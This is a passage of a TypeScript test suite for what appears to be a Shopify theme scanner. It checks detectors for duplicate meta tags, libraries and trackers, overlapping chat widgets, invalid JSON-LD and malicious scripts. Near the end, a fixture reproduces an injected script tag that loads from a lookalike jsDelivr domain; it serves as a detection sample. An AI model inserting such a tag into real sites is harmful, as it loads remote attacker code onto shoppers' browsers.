      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          '<meta name="description" content="Active description">',
          "{% comment %}",
          '<meta name="description" content="Commented out description">',
          "{% endcomment %}",
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });
  });

  describe("Repeatable OG property allowlist", () => {
    it("does NOT flag repeated og:image tags (repeatable per OG spec)", () => {
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: [
          '<meta property="og:image" content="https://cdn.shopify.com/image1.jpg">',
          '<meta property="og:image" content="https://cdn.shopify.com/image2.jpg">',
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });

    it("does NOT flag repeated og:image:secure_url (repeatable sub-property)", () => {
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: [
          '<meta property="og:image:secure_url" content="https://cdn.shopify.com/image1.jpg">',
          '<meta property="og:image:secure_url" content="https://cdn.shopify.com/image2.jpg">',
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });

    it("does NOT flag repeated article:tag (explicitly repeatable per OG spec)", () => {
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: [
          '<meta property="article:tag" content="shoes">',
          '<meta property="article:tag" content="sneakers">',
          '<meta property="article:tag" content="sale">',
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });
  });

  describe("True duplicates still flagged (true positive preserved)", () => {
    it("still flags two unconditional identical <meta name='description'> tags", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          '<meta name="description" content="SEO description from app">',
          "<p>some content</p>",
          '<meta name="description" content="Native description">',
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.DUPLICATE_META);
      expect(findings[0].lineNumber).toBe(3);
      expect(findings[0].description).toContain("line 1");
    });

    it("still flags two unconditional duplicate og:title tags", () => {
      const file: ThemeFile = {
        filename: "layout/theme.liquid",
        content: [
          '<meta property="og:title" content="Title from App 1">',
          '<meta property="og:title" content="Title from App 2">',
        ].join("\n"),
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(1);
      expect(findings[0].description).toContain("og:title");
    });
  });

  describe("Dawn meta-tags.liquid fixture — no false positives on stock theme", () => {
    it("emits zero DUPLICATE_META findings on Dawn's snippets/meta-tags.liquid", () => {
      // Dawn's meta-tags.liquid uses og:type inside a conditional (via {% liquid %}),
      // og:image / og:image:secure_url inside {%- if page_image -%} block, and
      // og:price:amount inside {%- if request.page_type == 'product' -%}.
      // None of these should be flagged as duplicates.
      const file: ThemeFile = {
        filename: "snippets/meta-tags.liquid",
        content: DAWN_META_TAGS,
      };
      const findings = detectDuplicateMetaTags(file);
      expect(findings).toHaveLength(0);
    });
  });
});

// ---------------------------------------------------------------------------
// detectDuplicateLibraries (cross-file)
// ---------------------------------------------------------------------------

describe("detectDuplicateLibraries", () => {
  const scriptTag = (url: string) => `<script src="${url}"></script>`;

  it("flags the same library at two distinct majors across files (exactly one finding)", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@8.4.5/swiper-bundle.min.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
    ];
    const findings = detectDuplicateLibraries(files);
    expect(findings).toHaveLength(1);

    const finding = findings[0];
    expect(finding.findingType).toBe(FindingType.DUPLICATE_LIBRARY);
    expect(finding.severity).toBe(Severity.MEDIUM);
    // Attributed to the lowest-major occurrence.
    expect(finding.filename).toBe("layout/theme.liquid");
    expect(finding.description).toContain("swiper");
    expect(finding.description).toContain("v8 (layout/theme.liquid)");
    expect(finding.description).toContain("v11 (sections/hero.liquid)");
  });

  it("detects a conflict across different CDNs (jsdelivr v8 + cdnjs v11)", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@8.4.5/swiper-bundle.min.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://cdnjs.cloudflare.com/ajax/libs/swiper/11.0.0/swiper.min.js"),
      },
    ];
    const findings = detectDuplicateLibraries(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("swiper");
  });

  it("does NOT flag the same major in two files", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.2.0/swiper-bundle.min.js"),
      },
    ];
    expect(detectDuplicateLibraries(files)).toHaveLength(0);
  });

  it("does NOT flag a single library seen once", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
    ];
    expect(detectDuplicateLibraries(files)).toHaveLength(0);
  });

  it("does NOT flag two different libraries each seen once", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://unpkg.com/vanilla-lazyload@17.8.3/dist/lazyload.min.js"),
      },
    ];
    expect(detectDuplicateLibraries(files)).toHaveLength(0);
  });

  it("does NOT flag two copies of the identical version", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
    ];
    expect(detectDuplicateLibraries(files)).toHaveLength(0);
  });

  it("ignores non-CDN script URLs entirely", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.acme-app.com/swiper@8/widget.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://cdn.acme-app.com/swiper@11/widget.js"),
      },
    ];
    expect(detectDuplicateLibraries(files)).toHaveLength(0);
  });

  it("sees libraries A1 suppresses in the unknown-script collectors (reads raw URLs)", () => {
    // swiper is in the benign seed list, so collectUnknownScripts DROPS it; the
    // duplicate detector must still catch a cross-file major conflict.
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@8.4.5/swiper-bundle.min.js"),
      },
      {
        filename: "sections/hero.liquid",
        content: scriptTag("https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.js"),
      },
    ];
    const { findings } = scanThemeFiles(files);
    expect(findingsOfType(findings, FindingType.DUPLICATE_LIBRARY)).toHaveLength(1);
  });

  // gc-tus.12: floating dist-tags (@latest, @next, ...) resolve at load time,
  // so their major is unknown. Each distinct tag counts as its own version: a
  // tag alongside a pinned major (or another tag) is two copies loaded, but the
  // SAME tag twice is one version, like two identical pinned versions.
  describe("floating version tags (gc-tus.12)", () => {
    const two = (a: string, b: string): ThemeFile[] => [
      { filename: "layout/theme.liquid", content: scriptTag(a) },
      { filename: "sections/hero.liquid", content: scriptTag(b) },
    ];
    const jsd = (spec: string) => `https://cdn.jsdelivr.net/npm/${spec}/dist/x.min.js`;

    it.each(["latest", "next", "beta", "canary"])(
      "flags swiper@%s alongside a pinned swiper@8.4.5",
      (tag) => {
        const findings = detectDuplicateLibraries(two(jsd(`swiper@${tag}`), jsd("swiper@8.4.5")));
        expect(findings).toHaveLength(1);
        const [finding] = findings;
        expect(finding.findingType).toBe(FindingType.DUPLICATE_LIBRARY);
        // Pinned majors sort before tags, so the anchor is the v8 copy.
        expect(finding.filename).toBe("sections/hero.liquid");
        expect(finding.description).toContain("v8 (sections/hero.liquid)");
        expect(finding.description).toContain(`@${tag} (layout/theme.liquid)`);
        // Floating-tag match: a possible duplicate, not a proven conflict.
        expect(finding.description).toContain("possible duplicate copies");
        expect(finding.description).not.toContain("conflicting");
        expect(finding.severity).toBe(Severity.LOW);
      },
    );

    it("flags two different floating tags of the same package", () => {
      const findings = detectDuplicateLibraries(two(jsd("swiper@next"), jsd("swiper@latest")));
      expect(findings).toHaveLength(1);
      // Tags sort alphabetically: @latest anchors.
      expect(findings[0].filename).toBe("sections/hero.liquid");
      expect(findings[0].description).toContain(
        "@latest (sections/hero.liquid), @next (layout/theme.liquid)",
      );
    });

    it("flags a tag against a pinned major on another npm CDN", () => {
      const findings = detectDuplicateLibraries(
        two("https://unpkg.com/swiper@latest/swiper-bundle.min.js", jsd("swiper@11.0.5")),
      );
      expect(findings).toHaveLength(1);
    });

    it("does NOT flag the same floating tag twice (one resolved version)", () => {
      expect(detectDuplicateLibraries(two(jsd("swiper@latest"), jsd("swiper@latest")))).toEqual([]);
      expect(detectDuplicateLibraries(two(jsd("swiper@latest"), jsd("swiper@LATEST")))).toEqual([]);
    });

    it("does NOT flag a floating tag of a DIFFERENT package", () => {
      expect(detectDuplicateLibraries(two(jsd("swiper@latest"), jsd("lodash@4.17.21")))).toEqual(
        [],
      );
      expect(detectDuplicateLibraries(two(jsd("swiper@latest"), jsd("swiper-extra@8")))).toEqual(
        [],
      );
      expect(detectDuplicateLibraries(two(jsd("swiper@latest"), jsd("lodash@next")))).toEqual([]);
    });

    it("treats range-like versions by their major (^1, ~2, bare 3)", () => {
      // Same major: no conflict. (`^1` used to parse as major 5 from `%5E1`.)
      expect(detectDuplicateLibraries(two(jsd("swiper@^1"), jsd("swiper@1.2.3")))).toEqual([]);
      expect(detectDuplicateLibraries(two(jsd("swiper@3"), jsd("swiper@3.1.0")))).toEqual([]);
      // Different majors: the usual major-version conflict and wording.
      const findings = detectDuplicateLibraries(two(jsd("swiper@~2"), jsd("swiper@3")));
      expect(findings).toHaveLength(1);
      expect(findings[0].description).toBe(
        'Library "swiper" is loaded at 2 conflicting major versions: v2 (layout/theme.liquid), v3 (sections/hero.liquid)',
      );
    });

    // Owner decision 1A: when the match depends on a floating tag, whose
    // resolved version is unknown, it is a POSSIBLE duplicate: LOW severity and
    // "may be loaded more than once" wording instead of "conflicting versions".
    it("reports @beta + @next as a LOW possible duplicate", () => {
      const findings = detectDuplicateLibraries(two(jsd("alpinejs@beta"), jsd("alpinejs@next")));
      expect(findings).toHaveLength(1);
      expect(findings[0].severity).toBe(Severity.LOW);
      expect(findings[0].description).toBe(
        'Library "alpinejs" may be loaded more than once (possible duplicate copies): ' +
          "@beta (layout/theme.liquid), @next (sections/hero.liquid). " +
          "A floating tag like @latest resolves when the page loads, so its version is unknown",
      );
    });

    it("reports @latest + 8.4.5 as a LOW possible duplicate", () => {
      const findings = detectDuplicateLibraries(two(jsd("swiper@latest"), jsd("swiper@8.4.5")));
      expect(findings).toHaveLength(1);
      expect(findings[0].severity).toBe(Severity.LOW);
      expect(findings[0].description).toBe(
        'Library "swiper" may be loaded more than once (possible duplicate copies): ' +
          "v8 (sections/hero.liquid), @latest (layout/theme.liquid). " +
          "A floating tag like @latest resolves when the page loads, so its version is unknown",
      );
    });

    it("does NOT treat an unknown suffix like @x as a floating tag", () => {
      expect(detectDuplicateLibraries(two(jsd("swiper@x"), jsd("swiper@latest")))).toEqual([]);
      expect(detectDuplicateLibraries(two(jsd("swiper@v"), jsd("swiper@8.4.5")))).toEqual([]);
    });

    it("keeps pinned-vs-pinned conflicts (8.x vs 11.x) at MEDIUM with conflict wording", () => {
      const findings = detectDuplicateLibraries(two(jsd("swiper@8.x"), jsd("swiper@11.x")));
      expect(findings).toHaveLength(1);
      expect(findings[0].severity).toBe(Severity.MEDIUM);
      expect(findings[0].description).toBe(
        'Library "swiper" is loaded at 2 conflicting major versions: v8 (layout/theme.liquid), v11 (sections/hero.liquid)',
      );
    });

    it("keeps a genuine pinned conflict MEDIUM even when a floating tag is also present", () => {
      const files: ThemeFile[] = [
        ...two(jsd("swiper@11.0.5"), jsd("swiper@latest")),
        { filename: "snippets/x.liquid", content: scriptTag(jsd("swiper@8")) },
      ];
      const [finding] = detectDuplicateLibraries(files);
      expect(finding.severity).toBe(Severity.MEDIUM);
      expect(finding.description).toContain("conflicting versions");
    });

    it("lists every version when tags and several majors mix", () => {
      const files: ThemeFile[] = [
        ...two(jsd("swiper@11.0.5"), jsd("swiper@latest")),
        { filename: "snippets/x.liquid", content: scriptTag(jsd("swiper@8")) },
      ];
      const findings = detectDuplicateLibraries(files);
      expect(findings).toHaveLength(1);
      expect(findings[0].filename).toBe("snippets/x.liquid");
      expect(findings[0].description).toContain(
        "3 conflicting versions: v8 (snippets/x.liquid), v11 (layout/theme.liquid), @latest (sections/hero.liquid)",
      );
    });

    it("keeps the benign-library suppression for floating swiper tags", () => {
      const result = scanThemeFiles(two(jsd("swiper@latest"), jsd("swiper@8.4.5")));
      expect(result.unknownScripts).toEqual([]);
      expect(findingsOfType(result.findings, FindingType.DUPLICATE_LIBRARY)).toHaveLength(1);
    });
  });
});

// ---------------------------------------------------------------------------
// detectDuplicateTrackers (cross-file)
// ---------------------------------------------------------------------------

describe("detectDuplicateTrackers", () => {
  it("flags GA4 configured with two distinct IDs across files (exactly one finding)", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: "gtag('config', 'G-AAAA1111');",
      },
      {
        filename: "snippets/analytics.liquid",
        content: "gtag('config', 'G-BBBB2222');",
      },
    ];
    const findings = detectDuplicateTrackers(files);
    expect(findings).toHaveLength(1);

    const finding = findings[0];
    expect(finding.findingType).toBe(FindingType.DUPLICATE_TRACKER);
    expect(finding.severity).toBe(Severity.MEDIUM);
    // Anchored at the first-seen occurrence of the platform.
    expect(finding.filename).toBe("layout/theme.liquid");
    expect(finding.description).toContain("Google Analytics 4");
    expect(finding.description).toContain("G-AAAA1111 (layout/theme.liquid)");
    expect(finding.description).toContain("G-BBBB2222 (snippets/analytics.liquid)");
  });

  it("detects a GA4 conflict between a script src and a gtag config call", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://www.googletagmanager.com/gtag/js?id=G-AAAA1111"></script>',
      },
      {
        filename: "snippets/extra.liquid",
        content: "gtag('config', 'G-CCCC3333');",
      },
    ];
    const findings = detectDuplicateTrackers(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.DUPLICATE_TRACKER);
    expect(findings[0].description).toContain("Google Analytics 4");
  });

  it("does NOT flag the same GA4 ID repeated across files", () => {
    const files: ThemeFile[] = [
      { filename: "layout/theme.liquid", content: "gtag('config', 'G-AAAA1111');" },
      { filename: "snippets/analytics.liquid", content: "gtag('config', 'G-AAAA1111');" },
    ];
    expect(detectDuplicateTrackers(files)).toHaveLength(0);
  });

  it("does NOT flag a single GA4 ID seen once", () => {
    const files: ThemeFile[] = [
      { filename: "layout/theme.liquid", content: "gtag('config', 'G-AAAA1111');" },
    ];
    expect(detectDuplicateTrackers(files)).toHaveLength(0);
  });

  it("flags Meta Pixel configured with two distinct init IDs via fbq", () => {
    const files: ThemeFile[] = [
      { filename: "layout/theme.liquid", content: "fbq('init', '111111111111111');" },
      { filename: "snippets/pixel.liquid", content: 'fbq("init", "222222222222222");' },
    ];
    const findings = detectDuplicateTrackers(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.DUPLICATE_TRACKER);
    expect(findings[0].description).toContain("Meta Pixel");
    expect(findings[0].description).toContain("111111111111111");
    expect(findings[0].description).toContain("222222222222222");
  });

  it("does NOT flag distinct platforms that each have a single ID (mixed, no per-platform conflict)", () => {
    const files: ThemeFile[] = [
      { filename: "layout/theme.liquid", content: "gtag('config', 'G-AAAA1111');" },
      { filename: "snippets/pixel.liquid", content: "fbq('init', '111111111111111');" },
    ];
    expect(detectDuplicateTrackers(files)).toHaveLength(0);
  });

  it("returns no findings for empty input", () => {
    expect(detectDuplicateTrackers([])).toHaveLength(0);
  });

  it("surfaces DUPLICATE_TRACKER findings through scanThemeFiles", () => {
    const files: ThemeFile[] = [
      { filename: "layout/theme.liquid", content: "gtag('config', 'G-AAAA1111');" },
      { filename: "snippets/analytics.liquid", content: "gtag('config', 'G-BBBB2222');" },
    ];
    const { findings } = scanThemeFiles(files);
    expect(findingsOfType(findings, FindingType.DUPLICATE_TRACKER)).toHaveLength(1);
  });

  it("does NOT count bare GA4 IDs that lack gtag/googletagmanager context on the line", () => {
    // Two distinct G-… strings in product copy with no tracker call context.
    const files: ThemeFile[] = [
      { filename: "templates/product.liquid", content: "<p>Model G-BLACK01 in stock</p>" },
      { filename: "snippets/copy.liquid", content: "<p>Also see G-WHITE99 edition</p>" },
    ];
    expect(detectDuplicateTrackers(files)).toHaveLength(0);
  });

  it("does NOT count GA4 IDs inside a {% comment %} block", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content:
          "{% comment %}\ngtag('config', 'G-AAAA1111');\ngtag('config', 'G-BBBB2222');\n{% endcomment %}",
      },
    ];
    expect(detectDuplicateTrackers(files)).toHaveLength(0);
  });

  it("does NOT scan non-Liquid files (IDs in assets/*.js are ignored)", () => {
    const files: ThemeFile[] = [
      { filename: "assets/app.js", content: "gtag('config', 'G-AAAA1111');" },
      { filename: "assets/vendor.js", content: "gtag('config', 'G-BBBB2222');" },
    ];
    expect(detectDuplicateTrackers(files)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// detectOverlappingChatWidgets (cross-file)
// ---------------------------------------------------------------------------

describe("detectOverlappingChatWidgets", () => {
  it("flags two distinct chat platforms (Intercom + Drift) as one finding", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://widget.intercom.io/widget/abc123"></script>',
      },
      {
        filename: "snippets/chat.liquid",
        content: '<script src="https://js.driftt.com/include/drift.js"></script>',
      },
    ];
    const findings = detectOverlappingChatWidgets(files);
    expect(findings).toHaveLength(1);

    const finding = findings[0];
    expect(finding.findingType).toBe(FindingType.OVERLAPPING_CHAT_WIDGET);
    expect(finding.severity).toBe(Severity.LOW);
    // Anchored at the first-seen occurrence.
    expect(finding.filename).toBe("layout/theme.liquid");
    expect(finding.description).toContain("Intercom (layout/theme.liquid)");
    expect(finding.description).toContain("Drift (snippets/chat.liquid)");
  });

  it("does NOT flag a single platform referenced twice", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://widget.intercom.io/widget/abc123"></script>',
      },
      {
        filename: "snippets/chat.liquid",
        content: "window.Intercom('boot', { app_id: 'abc123' });",
      },
    ];
    expect(detectOverlappingChatWidgets(files)).toHaveLength(0);
  });

  it("does NOT fire the Zendesk zE( signature on innocuous calls like resize(", () => {
    const files: ThemeFile[] = [
      { filename: "assets/theme.liquid", content: "window.addEventListener('resize', onResize);" },
      { filename: "snippets/util.liquid", content: "element.resize();\nfoo.size();" },
    ];
    expect(detectOverlappingChatWidgets(files)).toHaveLength(0);
  });

  it("returns no findings for empty input", () => {
    expect(detectOverlappingChatWidgets([])).toHaveLength(0);
  });

  it("surfaces OVERLAPPING_CHAT_WIDGET findings through scanThemeFiles", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://widget.intercom.io/widget/abc123"></script>',
      },
      {
        filename: "snippets/chat.liquid",
        content: '<script src="https://embed.tawk.to/abc/default"></script>',
      },
    ];
    const { findings } = scanThemeFiles(files);
    expect(findingsOfType(findings, FindingType.OVERLAPPING_CHAT_WIDGET)).toHaveLength(1);
  });

  it("does NOT count a zE( match from a minified assets bundle (non-Liquid file skipped)", () => {
    // A minified vendor bundle in assets/ trips the zE( signature, but assets/
    // is non-scannable so it must be ignored — leaving only the one real widget,
    // which is not a conflict.
    const files: ThemeFile[] = [
      { filename: "assets/vendor.min.js", content: "function zE(a){return a};zE(1);" },
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://widget.intercom.io/widget/abc123"></script>',
      },
    ];
    expect(detectOverlappingChatWidgets(files)).toHaveLength(0);
  });

  it("does NOT count chat widgets referenced inside a {% comment %} block", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content:
          '{% comment %}\n<script src="https://widget.intercom.io/widget/abc123"></script>\n<script src="https://js.driftt.com/include/drift.js"></script>\n{% endcomment %}',
      },
    ];
    expect(detectOverlappingChatWidgets(files)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Cross-file anchor stability: DUPLICATE_TRACKER / OVERLAPPING_CHAT_WIDGET pick
// their anchor by folder priority (layout > sections > snippets > blocks >
// templates, then filename, then line), never by input order. The anchor feeds
// the scan-differ fingerprint, so an input-order anchor churns "resolved"/"new".
// ---------------------------------------------------------------------------

describe("cross-file detectors anchor deterministically, independent of input order", () => {
  const permutations = <T>(items: T[]): T[][] =>
    items.length <= 1
      ? [items]
      : items.flatMap((item, i) =>
          permutations([...items.slice(0, i), ...items.slice(i + 1)]).map((rest) => [
            item,
            ...rest,
          ]),
        );

  const trackerFiles: ThemeFile[] = [
    { filename: "blocks/ga-block.liquid", content: "gtag('config', 'G-BBBB2222');" },
    {
      filename: "layout/theme.liquid",
      content: "<head>\n  gtag('config', 'G-AAAA1111');\n</head>",
    },
    { filename: "snippets/tracking.liquid", content: "gtag('config', 'G-CCCC3333');" },
    { filename: "templates/page.liquid", content: "gtag('config', 'G-DDDD4444');" },
  ];

  const chatFiles: ThemeFile[] = [
    {
      filename: "blocks/chat.liquid",
      content: '<script src="https://code.tidio.co/x.js"></script>',
    },
    {
      filename: "layout/theme.liquid",
      content: '<head></head>\n<script src="https://widget.intercom.io/widget/abc"></script>',
    },
    {
      filename: "sections/help.liquid",
      content: '<script src="https://js.driftt.com/d.js"></script>',
    },
  ];

  it("anchors DUPLICATE_TRACKER on layout/theme.liquid when a block file comes first", () => {
    const findings = detectDuplicateTrackers(trackerFiles);
    expect(findings).toHaveLength(1);
    expect(findings[0].filename).toBe("layout/theme.liquid");
    expect(findings[0].lineNumber).toBe(2);
  });

  it("anchors OVERLAPPING_CHAT_WIDGET on layout/theme.liquid when a block file comes first", () => {
    const findings = detectOverlappingChatWidgets(chatFiles);
    expect(findings).toHaveLength(1);
    expect(findings[0].filename).toBe("layout/theme.liquid");
    expect(findings[0].lineNumber).toBe(2);
  });

  it("DUPLICATE_TRACKER yields the same finding for every input-order permutation", () => {
    const outputs = permutations(trackerFiles).map((order) => detectDuplicateTrackers(order));
    for (const out of outputs) expect(out).toEqual(outputs[0]);
    expect(outputs).toHaveLength(24);
  });

  it("OVERLAPPING_CHAT_WIDGET yields the same finding for every input-order permutation", () => {
    const outputs = permutations(chatFiles).map((order) => detectOverlappingChatWidgets(order));
    for (const out of outputs) expect(out).toEqual(outputs[0]);
  });

  it("prefers sections > snippets > blocks > templates when there is no layout hit", () => {
    const files: ThemeFile[] = [
      { filename: "templates/a.liquid", content: "fbq('init', '111111111111111');" },
      { filename: "blocks/a.liquid", content: "fbq('init', '222222222222222');" },
      { filename: "snippets/z.liquid", content: "fbq('init', '333333333333333');" },
    ];
    expect(detectDuplicateTrackers(files)[0].filename).toBe("snippets/z.liquid");
    expect(detectDuplicateTrackers(files.slice(0, 2))[0].filename).toBe("blocks/a.liquid");
    const withSection = [
      ...files,
      { filename: "sections/b.liquid", content: "fbq('init', '4444444444');" },
    ];
    expect(detectDuplicateTrackers(withSection)[0].filename).toBe("sections/b.liquid");
  });

  it("breaks folder ties by filename, then by lowest line", () => {
    const files: ThemeFile[] = [
      { filename: "snippets/b.liquid", content: "gtag('config', 'G-AAAA1111');" },
      {
        filename: "snippets/a.liquid",
        content: "x\ngtag('config', 'G-BBBB2222');\ngtag('config', 'G-CCCC3333');",
      },
    ];
    const [finding] = detectDuplicateTrackers(files);
    expect(finding.filename).toBe("snippets/a.liquid");
    expect(finding.lineNumber).toBe(2);
  });

  it("records the best location of an ID seen in both a block and layout in the description", () => {
    const files: ThemeFile[] = [
      { filename: "blocks/ga.liquid", content: "gtag('config', 'G-AAAA1111');" },
      { filename: "layout/theme.liquid", content: "gtag('config', 'G-AAAA1111');" },
      { filename: "snippets/s.liquid", content: "gtag('config', 'G-BBBB2222');" },
    ];
    const [finding] = detectDuplicateTrackers(files);
    expect(finding.filename).toBe("layout/theme.liquid");
    expect(finding.description).toContain("G-AAAA1111 (layout/theme.liquid)");
    expect(finding.description).not.toContain("blocks/ga.liquid");
  });

  it("orders same-line platforms in the description independent of input order", () => {
    const files: ThemeFile[] = [
      { filename: "blocks/a.liquid", content: "Tawk_API = {};" },
      { filename: "layout/theme.liquid", content: "Tawk_API = {}; window.Intercom('boot');" },
    ];
    const forward = detectOverlappingChatWidgets(files);
    const reverse = detectOverlappingChatWidgets([...files].reverse());
    expect(forward).toEqual(reverse);
    expect(forward[0].description).toContain(
      "Intercom (layout/theme.liquid), Tawk.to (layout/theme.liquid)",
    );
  });

  it("keeps the anchor stable through scanThemeFiles with blocks sorted first", () => {
    const result = scanThemeFiles(trackerFiles);
    const [finding] = findingsOfType(result.findings, FindingType.DUPLICATE_TRACKER);
    expect(finding.filename).toBe("layout/theme.liquid");
  });
});

// ---------------------------------------------------------------------------
// JSON_LD_INVALID detection (detectInvalidJsonLd)
// ---------------------------------------------------------------------------

describe("detectInvalidJsonLd", () => {
  it("flags a malformed static JSON-LD block", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      // Trailing comma → invalid JSON.
      content:
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget",}</script>',
    };
    const findings = detectInvalidJsonLd(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.JSON_LD_INVALID);
    expect(findings[0].filename).toBe("templates/product.liquid");
    expect(findings[0].description.toLowerCase()).toContain("not valid json");
    // Malformed structured data → MEDIUM by default.
    expect(findings[0].severity).toBe(Severity.MEDIUM);
  });

  it("does NOT flag a valid static JSON-LD block", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content:
        '<script type="application/ld+json">{"@context":"https://schema.org","@type":"Product","name":"Widget"}</script>',
    };
    expect(detectInvalidJsonLd(file)).toHaveLength(0);
  });

  it("does NOT flag a Liquid-templated block even when its raw form is not valid JSON (FP guard)", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      // Raw content is unparseable JSON, but it is a native Liquid-rendered block.
      content:
        '<script type="application/ld+json">{"@type":"Product","name":{{ product.title | json }},}</script>',
    };
    expect(detectInvalidJsonLd(file)).toHaveLength(0);
  });

  it("does NOT flag a Liquid {% %} tag block whose raw form is invalid JSON (FP guard)", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content:
        '<script type="application/ld+json">{% if product %}{"@type":"Product"}{% endif %}</script>',
    };
    expect(detectInvalidJsonLd(file)).toHaveLength(0);
  });

  it("skips empty / whitespace-only blocks (no data to lose)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<script type="application/ld+json">   \n  </script>',
    };
    expect(detectInvalidJsonLd(file)).toHaveLength(0);
  });

  it("emits one finding per malformed block when multiple are present", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{not valid json}</script>',
        '<script type="application/ld+json">{"@type":"Product","name":"Valid"}</script>',
        "<script type=\"application/ld+json\">{'@type': 'Review'}</script>",
      ].join("\n"),
    };
    const findings = detectInvalidJsonLd(file);
    expect(findings).toHaveLength(2);
    expect(findings.every((f) => f.findingType === FindingType.JSON_LD_INVALID)).toBe(true);
  });

  it("surfaces JSON_LD_INVALID findings through scanThemeFiles (all-plans, no gate)", () => {
    const files: ThemeFile[] = [
      {
        filename: "templates/product.liquid",
        content: '<script type="application/ld+json">{"@type":"Product",,}</script>',
      },
    ];
    const { findings } = scanThemeFiles(files);
    expect(findingsOfType(findings, FindingType.JSON_LD_INVALID)).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// MALICIOUS_SCRIPT detection (detectMaliciousScripts)
// ---------------------------------------------------------------------------

describe("detectMaliciousScripts", () => {
  // Real-world injection observed in prod 2026-09-22 (fake jsDelivr lookalike).
  const INJECTED =
    '<script src="{{ \'a-media-gallery.js\' | asset_url }}" defer="defer"></script> <script src="https://shopify.jsdeliver.cloud/config.js" async></script>';

  it("flags a script loaded from a known-malicious lookalike domain as HIGH", () => {
    const file: ThemeFile = { filename: "sections/a-dependencies.liquid", content: INJECTED };
    const findings = detectMaliciousScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    expect(findings[0].severity).toBe(Severity.HIGH);
    expect(findings[0].filename).toBe("sections/a-dependencies.liquid");
    expect(findings[0].lineNumber).toBe(1);
    expect(findings[0].description).toContain("jsdeliver.cloud");
    expect(findings[0].codeSnippet).toContain("shopify.jsdeliver.cloud/config.js");
  });

  it("does NOT flag the legitimate jsDelivr CDN (lookalike FP guard)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(0);
  });

  it("matches on a dot boundary only (no substring false positives)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<script src="https://notjsdeliver.cloud/x.js"></script>',
        '<script src="https://jsdeliver.cloud.example.com/x.js"></script>',
      ].join("\n"),
    };
